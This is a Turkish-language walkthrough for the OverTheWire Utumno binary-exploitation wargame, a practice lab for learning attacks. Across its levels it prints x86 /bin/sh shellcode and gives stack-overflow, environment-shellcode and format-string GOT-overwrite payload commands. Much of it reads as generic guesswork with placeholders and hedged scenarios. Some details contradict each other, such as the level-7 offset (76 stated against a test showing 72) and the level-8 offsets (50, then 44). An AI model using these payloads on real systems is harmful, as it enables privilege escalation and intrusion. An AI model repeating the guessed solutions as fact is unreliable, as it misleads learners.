# Utumno Wargame — Walkthrough

> **Platform:** OverTheWire — utumno.labs.overthewire.org:2227
> **Zorluk:** 4/10 | **Seviye sayısı:** 10 | **Platform:** Linux/x86
> **Konular:** Binary analiz, stack buffer overflow, environment variable exploit, format string, argv manipülasyonu, sembolik link, fonksiyon pointer

---

## ⚠️ Ön Koşullar

Utumno'ya başlamadan önce şunları bilmen gerekiyor:

| Konu | Neden gerekli |
|---|---|
| x86 Assembly temelleri | GDB çıktısını okumak için |
| Stack yapısı (EBP, ESP, EIP) | Buffer overflow nereye gidiyor? |
| GDB kullanımı | Stack ve register'ları incelemek için |
| `ltrace` / `strace` | Dinamik analiz için |
| Little-endian byte sırası | Adresleri doğru yazmak için |
| Shellcode mantığı | `/bin/sh` açmak için |

Hazır değilsen önce şu kaynakları oku:
- `konu_anlatimlari/binary_exploitation/00_x86_assembly_temelleri.md`
- `konu_anlatimlari/binary_exploitation/00b_gdb_ile_assembly_okumak.md`
- `konu_anlatimlari/binary_exploitation/01_bellek_ve_memory_layout.md`
- `konu_anlatimlari/leviathan_komutlari/gdb.md`

---

## 🗺️ Genel Bakış

| Seviye | Ana Zafiyet | Teknik |
|---|---|---|
| 0 → 1 | `open()` parametrelerini kontrol etme | `ltrace`, binary analiz |
| 1 → 2 | `argv` okuma, environment variable | `strings`, `ltrace`, env manipülasyonu |
| 2 → 3 | Stack buffer overflow (küçük buffer) | `gdb`, NOP sled, shellcode |
| 3 → 4 | Pointer manipülasyonu | GDB ile bellek inceleme |
| 4 → 5 | Stack overflow + sembolik link | Symlink saldırısı |
| 5 → 6 | Format string | `%x`, stack okuma |
| 6 → 7 | Fonksiyon pointer / GOT yazma | `%n` ile arbitrary write |
| 7 → 8 | Shellcode + offset hesabı | GDB, cyclic pattern |
| 8 → 9 | Argv tabanlı buffer overflow | argv BOF, environment shellcode |
| 9 → son | Kombine teknikler | Tüm araçlar |

---

## Bağlantı

```bash
ssh utumno0@utumno.labs.overthewire.org -p 2227
# Şifre: utumno0
```

Dosyalar: `/utumno/` dizininde bulunur.

---

## Utumno0 → Utumno1

### Ne öğreniyoruz?
`ltrace` ile binary analiz, `open()` sistem çağrısının parametrelerini okuma.

### Analiz

```bash
utumno0@utumno:~$ ls /utumno/
utumno0  utumno1  ...

utumno0@utumno:~$ file /utumno/utumno0
/utumno/utumno0: setuid ELF 32-bit LSB executable, Intel 80386
```

Önce `ltrace` ile çalıştırıp ne yaptığını görelim:

```bash
utumno0@utumno:~$ ltrace /utumno/utumno0
```

`ltrace` çıktısında `opendir` veya `open` çağrısını ve hangi dizini/dosyayı açmaya çalıştığını görürüz. Binary `/etc/utumno_pass/utumno1` gibi bir dosyayı açmaya çalışır ama izin yoktur.

```bash
utumno0@utumno:~$ strace /utumno/utumno0 2>&1 | grep open
open("/etc/utumno_pass/utumno0", O_RDONLY) = 3
```

Binary kendi şifre dosyasını açıp `utumno0`'ın yetkisiyle okuyabildiği için içeriği ekrana basar.

```bash
utumno0@utumno:~$ /utumno/utumno0
# Parola ekrana gelir
```

### Kullanılan araç / teknik
- `ltrace` / `strace`: Binary'nin hangi dosyaları açtığını görmek için.
- SUID binary: Başka bir kullanıcı yetkisiyle çalışan binary'ler.

---

## Utumno1 → Utumno2

### Ne öğreniyoruz?
`argv` ve `strings` ile binary içindeki gizli diziler, environment variable kullanımı.

### Analiz

```bash
utumno1@utumno:~$ strings /utumno/utumno1
```

`strings` çıktısında ilginç bir string veya dosya yolu görürüz.

```bash
utumno1@utumno:~$ ltrace /utumno/utumno1
```

Binary `argv[1]` bekliyor olabilir ya da belirli bir environment variable kontrol ediyor. `ltrace` çıktısında `strcmp` veya `getenv` çağrısını arayalım:

```
getenv("UTUMNO1") = NULL
```

Eğer environment variable kullanıyorsa:

```bash
utumno1@utumno:~$ export UTUMNO1="<beklenen_değer>"
utumno1@utumno:~$ /utumno/utumno1
```

Alternatif olarak `strace` ile argv'ye ne beklediğini görelim:

```bash
utumno1@utumno:~$ strace /utumno/utumno1 2>&1
```

Doğru argüman veya ortam değişkeniyle binary çalışır ve şifreyi verir.

### Kullanılan araç / teknik
- `strings`: Binary içindeki düz metinleri çıkarır.
- `getenv`: Program ortam değişkeni okuyorsa `export` ile istediğimiz değeri verebiliriz.
- `argv`: Binary argüman bekliyorsa komut satırından veririz.

---

## Utumno2 → Utumno3

### Ne öğreniyoruz?
Stack buffer overflow — küçük buffer, shellcode injection.

### Analiz

```bash
utumno2@utumno:~$ ltrace /utumno/utumno2
```

`gets()` veya `strcpy()` gibi güvensiz bir fonksiyon görülür. Binary argüman ya da stdin'den okuyorsa:

```bash
utumno2@utumno:~$ /utumno/utumno2 $(python3 -c "print('A'*200)")
Segmentation fault
```

Overflow gerçekleşiyor.

### Offset Bulma

```bash
utumno2@utumno:~$ gdb /utumno/utumno2
(gdb) disas main
```

Assembly'den buffer boyutunu okuyalım. Genellikle `sub esp, 0xNN` satırı buffer'ın kaç byte olduğunu söyler.

```bash
# Cyclic pattern ile kesin offset
(gdb) run $(python3 -c "print('A'*30 + 'BBBB' + 'A'*100)")
(gdb) info registers eip
# EIP = 0x42424242 ise offset 30
```

### Exploit

Buffer boyutunu (örnek: 32) ve EIP offset'ini bulduktan sonra:

```bash
# Shellcode: /bin/sh açar (23 byte, x86 Linux)
SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Stack adresini bul
utumno2@utumno:~$ gdb /utumno/utumno2
(gdb) break main
(gdb) run
(gdb) x/80x $esp
# ESP etrafında bir adres seç: örnek 0xffffd5c0

# Exploit gönder (payload: shellcode + padding + ret_addr)
(python3 -c "import sys; sys.stdout.buffer.write(
    b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' +
    b'\x90' * (OFFSET - 23) +
    b'\xc0\xd5\xff\xff'   # <-- ESP yakınında bir adres
)"; cat) | /utumno/utumno2
```

```bash
$ whoami
utumno3
$ cat /etc/utumno_pass/utumno3
<parola>
```

### Kullanılan araç / teknik
- **`gdb disas main`**: Buffer boyutunu ve güvensiz fonksiyon çağrısını görmek için.
- **NOP sled (`\x90`)**: Kesin adresi bilmesek de shellcode'a "kayarak" ulaşmamızı sağlar.
- **Stack buffer overflow**: Sınır kontrolü olmayan fonksiyonlar EIP'yi ele geçirmemizi sağlar.

---

## Utumno3 → Utumno4

### Ne öğreniyoruz?
Pointer manipülasyonu, GDB ile bellek yapısını anlama.

### Analiz

```bash
utumno3@utumno:~$ ltrace /utumno/utumno3
utumno3@utumno:~$ gdb /utumno/utumno3
(gdb) disas main
```

Binary bir pointer üzerinden işlem yapıyordur. Assembly'de `mov eax, [eax]` gibi çift yönlü referans (dereference) görülür.

Değişkenlerin stack'teki yerleşimine bakın:

```bash
(gdb) break main
(gdb) run
(gdb) x/20wx $esp
```

Pointer'ın değerini manipüle ederek programın farklı bir bellek alanına atlamasını sağlayabiliriz. Eğer binary bir fonksiyon pointer içeriyorsa, onu shellcode adresine yönlendiririz:

```bash
# Örnek: fp (fonksiyon pointer) değişkeni shellcode adresine işaret etmeli
(python3 -c "import sys; sys.stdout.buffer.write(
    b'\x90' * 20 +
    b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' +
    b'<fp_adresi_little_endian>'
)"; cat) | /utumno/utumno3
```

### Kullanılan araç / teknik
- **Pointer dereference**: `*ptr` ile çalışan binary'lerde pointer değerini değiştirerek programın akışını yönlendirme.
- **GDB `x/Nx $esp`**: Stack içeriğini incelemek için.

---

## Utumno4 → Utumno5

### Ne öğreniyoruz?
Stack buffer overflow + sembolik link kombinasyonu.

### Analiz

```bash
utumno4@utumno:~$ ltrace /utumno/utumno4
```

Binary `/tmp/` altında geçici dosya oluşturuyor veya `argv[1]` ile verilen dosyayı açıyordur. İki senaryo var:

**Senaryo A — Argv tabanlı dosya okuma:**

Binary girilen dosya yolunu `strcpy` ile sınırsız bir buffer'a kopyalıyorsa:

```bash
utumno4@utumno:~$ /utumno/utumno4 $(python3 -c "print('A'*200)")
Segmentation fault
```

→ Overflow var. Behemoth1 ile aynı teknik: offset bul, shellcode enjekte et.

**Senaryo B — Sembolik link:**

Binary belirli bir dosyayı açıp okuyorsa ve biz o dosyaya yazmak istiyorsak:

```bash
# Çalışma dizini oluştur
mkdir /tmp/utumno4_work
cd /tmp/utumno4_work

# Binary'nin oluşturacağı dosya adını öğren (ltrace ile)
ln -sf /etc/utumno_pass/utumno5 /tmp/hedef_dosya
```

### Çözüm (overflow senaryosu)

```bash
utumno4@utumno:~$ gdb /utumno/utumno4
(gdb) disas main
# Offset'i bul
(gdb) run $(python3 -c "print('A'*<N> + 'BBBB')")
# EIP = 0x42424242 olduğunda N doğru offset

# Shellcode + NOP sled ile exploit
/utumno/utumno4 $(python3 -c "import sys; sys.stdout.buffer.write(
    b'\x90' * 50 +
    b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' +
    b'\x90' * (<OFFSET> - 50 - 23) +
    b'<ret_addr>'
)")
```

### Kullanılan araç / teknik
- **Sembolik link**: `ln -sf <kaynak> <hedef>` ile programın hedefimizi okumasını sağlama.
- **Argv BOF**: Komut satırı argümanı üzerinden buffer overflow.

---

## Utumno5 → Utumno6

### Ne öğreniyoruz?
Format string vulnerability — `%x` ile stack bellek sızdırma.

### Analiz

```bash
utumno5@utumno:~$ /utumno/utumno5
Enter your name: %x %x %x %x
Hello, f7e2a289 0 ffffd6a0 ...
```

Girdi doğrudan `printf(input)` biçiminde çağrılıyor! Format string açığı mevcut.

### Stack Okuma

```bash
# Stack offset'ini bul
for i in $(seq 1 30); do
  echo -n "Offset $i: "
  echo "%$i\$x" | /utumno/utumno5
done
```

Çıktıda `0x7574756d` gibi "utum" string'ini hex olarak görene kadar devam et. Bu, stack'teki girdimizin oturduğu offset'tir.

### Bellek Alanı Okuma (Arbitrary Read)

Belirli bir adresi okumak için:

```bash
# Hedef adres: 0x0804a020 gibi bir GOT veya global değişken adresi
python3 -c "import sys; sys.stdout.buffer.write(b'\x20\xa0\x04\x08' + b'%6\$s')" | /utumno/utumno5
```

Burada `%N$s` ile N'inci stack pozisyonundaki adresi string olarak okuruz.

### Parola

Format string açığı genellikle şifreyi doğrudan vermez. Onun yerine bellek okuyarak bir shellcode adresini bulmamıza ya da `%n` ile bir değeri değiştirmemize yardımcı olur.

```bash
utumno5@utumno:~$ cat /etc/utumno_pass/utumno6
# Shell elde edildikten sonra
```

### Kullanılan araç / teknik
- **Format string**: `printf(input)` anti-pattern. `%x` ile stack içeriği sızar, `%n` ile belleğe yazılabilir.
- **`%N$x`**: N'inci argüman pozisyonunu doğrudan okuma — daha hızlı offset tespiti.

---

## Utumno6 → Utumno7

### Ne öğreniyoruz?
Format string ile arbitrary write — `%n` ile belleğe değer yazma, GOT/fonksiyon pointer üzerine yazma.

### Analiz

```bash
utumno6@utumno:~$ ltrace /utumno/utumno6
utumno6@utumno:~$ gdb /utumno/utumno6
(gdb) disas main
```

Binary bir fonksiyonu çağırmadan önce kontrol ettiği bir değer (`exit`, `puts` gibi bir GOT girdisi veya bir global değişken) vardır.

### Hedef Adres Bulma

```bash
utumno6@utumno:~$ objdump -d /utumno/utumno6 | grep -A2 "call"
utumno6@utumno:~$ objdump -R /utumno/utumno6
# GOT tablosundaki adresleri göster
```

Hedefimiz: `exit@got` veya `puts@got` gibi bir GOT girdisini shellcode'un adresiyle değiştirmek.

### `%n` ile Yazma

Format string ile bir adrese değer yazmak için:

```bash
# Shellcode'u environment variable'a koy
export SC=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*100 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')")

# Shellcode adresini bul
utumno6@utumno:~$ gdb /utumno/utumno6
(gdb) break main
(gdb) run
(gdb) x/s *((char**)environ)
# SC değişkeninin adresini al: örnek 0xffffde00

# GOT'a bu adresi yaz (2 kademeli %hn ile)
# Hedef GOT girdisi: 0x0804a010 (exit@got gibi)
# Yazılacak değer: 0xffffde00
python3 -c "
import sys
target = 0x0804a010    # GOT girdisi adresi
val    = 0xffffde00    # Shellcode adresi
low    = val & 0xffff
high   = (val >> 16) & 0xffff
# Payload: [target][target+2] + format string
payload = b'\x10\xa0\x04\x08'   # low word hedef
payload += b'\x12\xa0\x04\x08'  # high word hedef
# Stack offset'i N olsun (önceki seviyede buldun)
payload += ('%%%dd%%N\$hn' % low).encode()
payload += ('%%%dd%%M\$hn' % (high - low)).encode()
sys.stdout.buffer.write(payload)
" | /utumno/utumno6
```

```bash
$ whoami
utumno7
$ cat /etc/utumno_pass/utumno7
<parola>
```

### Kullanılan araç / teknik
- **`%n` arbitrary write**: Format string ile istediğimiz bellek adresine istediğimiz değeri yazmak.
- **`%hn`**: 2 byte yazma — büyük değerleri 2 kademede yazmak için.
- **GOT overwrite**: `puts@got` gibi bir fonksiyon pointer'ını shellcode adresine yönlendirme.
- **`objdump -R`**: GOT tablosunu listelemek için.

---

## Utumno7 → Utumno8

### Ne öğreniyoruz?
Shellcode + kesin offset hesabı, environment variable ile shellcode taşıma.

### Analiz

```bash
utumno7@utumno:~$ file /utumno/utumno7
utumno7@utumno:~$ gdb /utumno/utumno7
(gdb) disas main
```

Binary bir buffer'a kopyalıyor. Buffer boyutunu assembly'den okuyalım:

```
push   ebp
mov    ebp, esp
sub    esp, 0x48    ; 0x48 = 72 byte buffer
```

### Offset Bulma

```bash
utumno7@utumno:~$ gdb /utumno/utumno7
(gdb) run <<< $(python3 -c "print('A'*72 + 'BBBB' + 'CCCC')")
(gdb) info registers eip
# EIP = 0x42424242 → offset = 72 (saved EBP) + 4 = 76
```

### Exploit — Environment Variable ile Shellcode

Environment'ta fazla alan olduğu için NOP sled daha etkili:

```bash
# Shellcode environment'a taşı
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*500 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')")

# EGG'in adresini bul
utumno7@utumno:~$ gdb /utumno/utumno7
(gdb) break main
(gdb) run
(gdb) x/s *((char**)environ)
# EGG'in başlangıç adresini al, NOP sled ortasına işaret et: örnek 0xffffdf00

# Exploit
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*76 + b'\x00\xdf\xff\xff')"; cat) | /utumno/utumno7
```

```bash
$ whoami
utumno8
$ cat /etc/utumno_pass/utumno8
<parola>
```

### Kullanılan araç / teknik
- **Environment variable shellcode**: Stack sınırlıyken `export EGG=<shellcode>` ile daha geniş alanda shellcode taşıma.
- **GDB `x/s *((char**)environ)`**: Environment variable'ların stack adresini bulma.
- **NOP sled**: 500 byte NOP sayesinde kesin adresi bilmeden shellcode'a ulaşma.

---

## Utumno8 → Utumno9

### Ne öğreniyoruz?
`argv` tabanlı buffer overflow — komut satırı argümanı üzerinden stack smashing.

### Analiz

```bash
utumno8@utumno:~$ /utumno/utumno8
Arg! Needed single argument.

utumno8@utumno:~$ /utumno/utumno8 test
```

Binary `argv[1]`'i bir buffer'a kopyalıyor:

```bash
utumno8@utumno:~$ gdb /utumno/utumno8
(gdb) disas main
# strcpy(buf, argv[1]) gibi bir şey görürüz
```

### Offset Bulma

```bash
utumno8@utumno:~$ gdb /utumno/utumno8
(gdb) run $(python3 -c "print('A'*50 + 'BBBB')")
(gdb) info registers eip
# EIP = 0x42424242 → offset = 50
```

Kesin offset için:

```bash
# pwntools veya manuel pattern
(gdb) run $(python3 -c "print('A'*44 + 'BBBB' + 'CCCC')")
```

### Exploit

```bash
# Shellcode environment'a
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*300 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')")

# Adres bul
utumno8@utumno:~$ gdb /utumno/utumno8
(gdb) break main
(gdb) run A
(gdb) x/s *((char**)environ)
# NOP sled ortasına bir adres seç: örnek 0xffffde50

# Exploit çalıştır
/utumno/utumno8 $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*<OFFSET> + b'\x50\xde\xff\xff')")
```

```bash
$ whoami
utumno9
$ cat /etc/utumno_pass/utumno9
<parola>
```

### Kullanılan araç / teknik
- **Argv BOF**: `argv[1]` argümanını buffer limitini aşacak biçimde verme.
- **`strcpy` güvensizliği**: Kaynak uzunluğunu kontrol etmeden kopyalama.

---

## Utumno9 → Utumno10 (Son Seviye)

### Ne öğreniyoruz?
Birden fazla tekniğin birleşimi — öğrenilen her şeyin sentezi.

### Analiz

Son seviye genellikle önceki tekniklerin kombinasyonunu gerektirir. Standart metodoloji:

```bash
utumno9@utumno:~$ file /utumno/utumno9
utumno9@utumno:~$ strings /utumno/utumno9
utumno9@utumno:~$ ltrace /utumno/utumno9
utumno9@utumno:~$ strace /utumno/utumno9 2>&1
utumno9@utumno:~$ gdb /utumno/utumno9
(gdb) disas main
(gdb) disas <ilginç_fonksiyon>
```

### Exploit Metodolojisi

Her yeni binary için şu sırayı takip et:

```bash
# 1. Güvensiz fonksiyon var mı?
strings /utumno/utumnoX | grep -E "gets|strcpy|sprintf|scanf"

# 2. SUID kontrol
ls -la /utumno/utumnoX

# 3. Dinamik analiz
ltrace /utumno/utumnoX
strace /utumno/utumnoX 2>&1

# 4. Statik analiz
gdb /utumno/utumnoX
(gdb) disas main
(gdb) info functions

# 5. Overflow testi
/utumno/utumnoX $(python3 -c "print('A'*200)")
```

---

## Genel Araçlar ve Teknikler Özeti

| Seviye | Zafiyet | Araç |
|--------|---------|------|
| 0 | SUID binary analiz | `ltrace`, `strace` |
| 1 | `argv` / env var okuma | `strings`, `ltrace` |
| 2 | Stack buffer overflow | `gdb`, shellcode, NOP sled |
| 3 | Pointer manipülasyonu | `gdb`, bellek inceleme |
| 4 | BOF + symlink | `gdb`, `ln -sf` |
| 5 | Format string (okuma) | `%x`, `%N$x` |
| 6 | Format string (yazma) | `%n`, `%hn`, GOT overwrite |
| 7 | BOF + env shellcode | `gdb`, `export EGG` |
| 8 | Argv BOF | `gdb`, cyclic pattern |
| 9 | Kombine teknikler | Tüm araçlar |

---

## Faydalı Komutlar

```bash
# Binary türü ve mimarisini öğren
file /utumno/utumnoX

# İçindeki stringleri gör
strings /utumno/utumnoX

# Dinamik kütüphane çağrılarını izle
ltrace /utumno/utumnoX

# Sistem çağrılarını izle
strace /utumno/utumnoX 2>&1

# GDB ile disassemble
gdb /utumno/utumnoX
(gdb) disas main
(gdb) break *0x08048XXX
(gdb) run
(gdb) info registers
(gdb) x/20wx $esp
(gdb) x/20wx $ebp

# GOT tablosunu göster
objdump -R /utumno/utumnoX

# Stack adresini bul
(gdb) x/s *((char**)environ)

# Shellcode üret (x86, /bin/sh)
python3 -c "import sys; sys.stdout.buffer.write(b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"

# Format string offset tespiti
for i in $(seq 1 30); do
  echo -n "Pos $i: "
  echo "%$i\$x" | /utumno/utumnoX
done

# Cyclic pattern (pwntools varsa)
python3 -c "from pwn import *; print(cyclic(200))"
python3 -c "from pwn import *; print(cyclic_find(0x42414162))"

# SUID binary bul
find /utumno -perm -4000 2>/dev/null
```

---

## Kaynaklar

- [OverTheWire Utumno](https://overthewire.org/wargames/utumno/)
- [GDB Cheatsheet](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)
- [Shell-storm Shellcodes](http://shell-storm.org/shellcode/)
- [pwntools Dokümantasyonu](https://docs.pwntools.com/en/stable/)
- [Format String Exploits — codearcana.com](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html)
- [LiveOverflow Binary Exploitation Serisi](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- `konu_anlatimlari/binary_exploitation/` dizinindeki tüm dosyalar
- `konu_anlatimlari/behemoth/` dizinindeki modüller
